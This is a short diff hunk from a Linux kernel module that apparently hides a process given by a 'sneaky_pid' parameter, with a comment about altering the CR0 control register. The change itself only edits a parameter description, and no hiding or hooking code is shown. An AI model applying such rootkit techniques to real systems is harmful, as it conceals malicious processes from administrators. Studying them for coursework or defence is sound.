@@ -19,7 +19,7 @@ struct linux_dirent {
 MODULE_LICENSE("GPL");
 static char * sneaky_pid = "";
 module_param(sneaky_pid, charp, 0);
-MODULE_PARM_DESC(pid, "sneaky_process 's pid");
+MODULE_PARM_DESC(pid, "sneaky_pid");
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
